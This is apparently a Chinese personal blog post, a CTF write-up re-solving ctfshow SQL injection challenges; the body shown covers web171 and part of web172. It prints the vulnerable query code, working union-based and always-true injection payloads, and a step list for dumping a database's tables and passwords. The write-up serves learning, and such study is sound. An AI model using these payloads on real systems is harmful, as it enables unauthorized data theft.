<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="把之前做过的一些sql注入的题重新做一遍，边做边记录边思考。">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入刷题">
<meta property="og:url" content="http://example.com/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/index.html">
<meta property="og:site_name" content="My0n9s&#39;blog">
<meta property="og:description" content="把之前做过的一些sql注入的题重新做一遍，边做边记录边思考。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img.picgo.net/2024/10/27/ctfshow1842b7ac98aa523f8a5.png">
<meta property="og:image" content="https://img.picgo.net/2024/10/27/web184ba5fe67a9b29282b.png">
<meta property="og:image" content="https://img.picgo.net/2024/10/27/web185461a4b073e1edcb2.png">
<meta property="og:image" content="https://img.picgo.net/2024/10/29/sql185_1512cec741387519f.png">
<meta property="og:image" content="https://img.picgo.net/2024/10/29/sql185_2da6d88d521321f6b.png">
<meta property="og:image" content="https://img.picui.cn/free/2024/11/07/672ce060081e8.png">
<meta property="og:image" content="https://img.picui.cn/free/2024/11/11/6731b4686e11f.png">
<meta property="og:image" content="https://img.picui.cn/free/2024/11/13/67340f8c733f0.png">
<meta property="og:image" content="https://img.picgo.net/2024/11/14/web231_1fbefcba2ee53bfa4.png">
<meta property="og:image" content="https://img.picgo.net/2024/11/14/web231_26059fee78c7235fb.png">
<meta property="og:image" content="https://img.picgo.net/2024/11/14/web2353ce6dc7f92aefed9.png">
<meta property="og:image" content="https://img.picgo.net/2024/11/14/web237a15cde6c44b35c14.png">
<meta property="og:image" content="https://img.picui.cn/free/2024/11/15/6736bed619f3c.png">
<meta property="og:image" content="https://img.picui.cn/free/2024/11/15/6736bf17a3536.png">
<meta property="article:published_time" content="2024-10-19T05:19:53.000Z">
<meta property="article:modified_time" content="2024-11-17T14:41:27.888Z">
<meta property="article:author" content="My0n9s">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.picgo.net/2024/10/27/ctfshow1842b7ac98aa523f8a5.png">


<link rel="canonical" href="http://example.com/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/","path":"2024/10/19/sql注入刷题/","title":"sql注入刷题"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>sql注入刷题 | My0n9s'blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">My0n9s'blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow"><span class="nav-number">1.</span> <span class="nav-text">ctfshow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web171"><span class="nav-number">1.1.</span> <span class="nav-text">web171</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web172"><span class="nav-number">1.2.</span> <span class="nav-text">web172</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="nav-number">1.2.1.</span> <span class="nav-text">解法一</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="nav-number">1.2.2.</span> <span class="nav-text">解法二</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89"><span class="nav-number">1.2.3.</span> <span class="nav-text">解法三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web173"><span class="nav-number">1.3.</span> <span class="nav-text">web173</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web174"><span class="nav-number">1.4.</span> <span class="nav-text">web174</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">解法一</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-2"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">解法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web175"><span class="nav-number">1.5.</span> <span class="nav-text">web175</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">解法一</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-3"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">反思</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web176"><span class="nav-number">1.6.</span> <span class="nav-text">web176</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-2"><span class="nav-number">1.6.2.</span> <span class="nav-text">解法二</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-4"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">反思</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web177"><span class="nav-number">1.7.</span> <span class="nav-text">web177</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-4"><span class="nav-number">1.7.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-3"><span class="nav-number">1.7.2.</span> <span class="nav-text">解法二</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-5"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89-1"><span class="nav-number">1.7.3.</span> <span class="nav-text">解法三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web178"><span class="nav-number">1.8.</span> <span class="nav-text">web178</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-5"><span class="nav-number">1.8.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-4"><span class="nav-number">1.8.2.</span> <span class="nav-text">解法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89-2"><span class="nav-number">1.8.3.</span> <span class="nav-text">解法三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web179"><span class="nav-number">1.9.</span> <span class="nav-text">web179</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-6"><span class="nav-number">1.9.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-5"><span class="nav-number">1.9.2.</span> <span class="nav-text">解法二</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-6"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">反思</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web180"><span class="nav-number">1.10.</span> <span class="nav-text">web180</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-7"><span class="nav-number">1.10.1.</span> <span class="nav-text">解法一</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web181"><span class="nav-number">1.11.</span> <span class="nav-text">web181</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-8"><span class="nav-number">1.11.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-6"><span class="nav-number">1.11.2.</span> <span class="nav-text">解法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%E5%8F%8A%E5%85%B6%E4%BB%96"><span class="nav-number">1.11.3.</span> <span class="nav-text">解法三及其他</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-7"><span class="nav-number">1.11.4.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web182"><span class="nav-number">1.12.</span> <span class="nav-text">web182</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web183"><span class="nav-number">1.13.</span> <span class="nav-text">web183</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-8"><span class="nav-number">1.13.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web184"><span class="nav-number">1.14.</span> <span class="nav-text">web184</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-9"><span class="nav-number">1.14.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-7"><span class="nav-number">1.14.2.</span> <span class="nav-text">解法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web185"><span class="nav-number">1.15.</span> <span class="nav-text">web185</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-10"><span class="nav-number">1.15.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-8"><span class="nav-number">1.15.2.</span> <span class="nav-text">解法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-9"><span class="nav-number">1.15.3.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web186"><span class="nav-number">1.16.</span> <span class="nav-text">web186</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web187"><span class="nav-number">1.17.</span> <span class="nav-text">web187</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web188"><span class="nav-number">1.18.</span> <span class="nav-text">web188</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web189"><span class="nav-number">1.19.</span> <span class="nav-text">web189</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-10"><span class="nav-number">1.20.</span> <span class="nav-text">反思</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web190"><span class="nav-number">1.21.</span> <span class="nav-text">web190</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web191"><span class="nav-number">1.22.</span> <span class="nav-text">web191</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web192"><span class="nav-number">1.23.</span> <span class="nav-text">web192</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web193"><span class="nav-number">1.24.</span> <span class="nav-text">web193</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web194"><span class="nav-number">1.25.</span> <span class="nav-text">web194</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web195"><span class="nav-number">1.26.</span> <span class="nav-text">web195</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web196"><span class="nav-number">1.27.</span> <span class="nav-text">web196</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web197"><span class="nav-number">1.28.</span> <span class="nav-text">web197</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web198"><span class="nav-number">1.29.</span> <span class="nav-text">web198</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web199"><span class="nav-number">1.30.</span> <span class="nav-text">web199</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web200"><span class="nav-number">1.31.</span> <span class="nav-text">web200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web201"><span class="nav-number">1.32.</span> <span class="nav-text">web201</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web202"><span class="nav-number">1.33.</span> <span class="nav-text">web202</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web203"><span class="nav-number">1.34.</span> <span class="nav-text">web203</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web204"><span class="nav-number">1.35.</span> <span class="nav-text">web204</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web205"><span class="nav-number">1.36.</span> <span class="nav-text">web205</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web206"><span class="nav-number">1.37.</span> <span class="nav-text">web206</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web207"><span class="nav-number">1.38.</span> <span class="nav-text">web207</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web208"><span class="nav-number">1.39.</span> <span class="nav-text">web208</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web209"><span class="nav-number">1.40.</span> <span class="nav-text">web209</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web210"><span class="nav-number">1.41.</span> <span class="nav-text">web210</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web211"><span class="nav-number">1.42.</span> <span class="nav-text">web211</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web212"><span class="nav-number">1.43.</span> <span class="nav-text">web212</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web213"><span class="nav-number">1.44.</span> <span class="nav-text">web213</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web214"><span class="nav-number">1.45.</span> <span class="nav-text">web214</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web215"><span class="nav-number">1.46.</span> <span class="nav-text">web215</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web216"><span class="nav-number">1.47.</span> <span class="nav-text">web216</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web217"><span class="nav-number">1.48.</span> <span class="nav-text">web217</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web218"><span class="nav-number">1.49.</span> <span class="nav-text">web218</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web219"><span class="nav-number">1.50.</span> <span class="nav-text">web219</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web220"><span class="nav-number">1.51.</span> <span class="nav-text">web220</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web221"><span class="nav-number">1.52.</span> <span class="nav-text">web221</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web222"><span class="nav-number">1.53.</span> <span class="nav-text">web222</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web223"><span class="nav-number">1.54.</span> <span class="nav-text">web223</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web224"><span class="nav-number">1.55.</span> <span class="nav-text">web224</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D-11"><span class="nav-number">1.55.1.</span> <span class="nav-text">反思</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web225"><span class="nav-number">1.56.</span> <span class="nav-text">web225</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.56.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.56.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web226"><span class="nav-number">1.57.</span> <span class="nav-text">web226</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web227"><span class="nav-number">1.58.</span> <span class="nav-text">web227</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web228"><span class="nav-number">1.59.</span> <span class="nav-text">web228</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web229"><span class="nav-number">1.60.</span> <span class="nav-text">web229</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web230"><span class="nav-number">1.61.</span> <span class="nav-text">web230</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web231"><span class="nav-number">1.62.</span> <span class="nav-text">web231</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web232"><span class="nav-number">1.63.</span> <span class="nav-text">web232</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web233"><span class="nav-number">1.64.</span> <span class="nav-text">web233</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web234"><span class="nav-number">1.65.</span> <span class="nav-text">web234</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web235"><span class="nav-number">1.66.</span> <span class="nav-text">web235</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web236"><span class="nav-number">1.67.</span> <span class="nav-text">web236</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web237"><span class="nav-number">1.68.</span> <span class="nav-text">web237</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web238"><span class="nav-number">1.69.</span> <span class="nav-text">web238</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web239"><span class="nav-number">1.70.</span> <span class="nav-text">web239</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web240"><span class="nav-number">1.71.</span> <span class="nav-text">web240</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web241"><span class="nav-number">1.72.</span> <span class="nav-text">web241</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web242"><span class="nav-number">1.73.</span> <span class="nav-text">web242</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web243"><span class="nav-number">1.74.</span> <span class="nav-text">web243</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web244"><span class="nav-number">1.75.</span> <span class="nav-text">web244</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web245"><span class="nav-number">1.76.</span> <span class="nav-text">web245</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web246"><span class="nav-number">1.77.</span> <span class="nav-text">web246</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web247"><span class="nav-number">1.78.</span> <span class="nav-text">web247</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web248"><span class="nav-number">1.79.</span> <span class="nav-text">web248</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web249"><span class="nav-number">1.80.</span> <span class="nav-text">web249</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web250"><span class="nav-number">1.81.</span> <span class="nav-text">web250</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web251"><span class="nav-number">1.82.</span> <span class="nav-text">web251</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web252"><span class="nav-number">1.83.</span> <span class="nav-text">web252</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web253"><span class="nav-number">1.84.</span> <span class="nav-text">web253</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="My0n9s"
      src="/images/touxiang.jpeg">
  <p class="site-author-name" itemprop="name">My0n9s</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">96</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="My0n9s">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My0n9s'blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="sql注入刷题 | My0n9s'blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          sql注入刷题
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-10-19 13:19:53" itemprop="dateCreated datePublished" datetime="2024-10-19T13:19:53+08:00">2024-10-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2024-11-17 22:41:27" itemprop="dateModified" datetime="2024-11-17T22:41:27+08:00">2024-11-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>把之前做过的一些sql注入的题重新做一遍，边做边记录边思考。</p>
<span id="more"></span>

<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>直接给了<code>sql语句</code>，这里我们想办法让它恒真把整张表所有的数据输出来就行了。没有任何过滤，可以用注释符<code>#</code>直接注释掉。</p>
<p>payload : <code>1&#39; or 1%23</code>， 在username为flag字段对应的password里面找到flag。<strong>注意这里我直接用#不行，换了url编码就好了</strong>。 做题的时候可以都试一下，**#不行不一定是把#过滤了，试试%23看行不行**。</p>
<p>当然<code>--+</code> 也可以起到注释的作用</p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>查询语句:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>返回逻辑:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>检查结果是否有flag</span><br><span class="line">    if($<span class="type">row</span><span class="operator">-</span><span class="operator">&gt;</span>username<span class="operator">!=</span><span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个题目对比71题就是多了一个返回内容的校验。</p>
<p>因为有回显位，其实我们可以用<code>union 联合注入</code>来做，最终的payload:</p>
<p>payload1:<code>-1&#39;union select 1,password from ctfshow_user2 where username=&#39;flag&#39;%23</code></p>
<p>payload2:<code>-1&#39;union select 1,group_concat(password)from ctfshow_user2 %23</code></p>
<p>联合注入的流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.oder by 来试探有几列：</span><br><span class="line">2.依次 1&#x27;order by 1 , 1&#x27;order by 2 , 1&#x27;order by 3 , 发现 3的时候是报错的。说明有两列。</span><br><span class="line">3.-1&#x27;union select 1,2%23，来看回显位在哪里。</span><br><span class="line">4.找到回显位之后就是依次暴库，爆表，爆字段，爆值</span><br></pre></td></tr></table></figure>
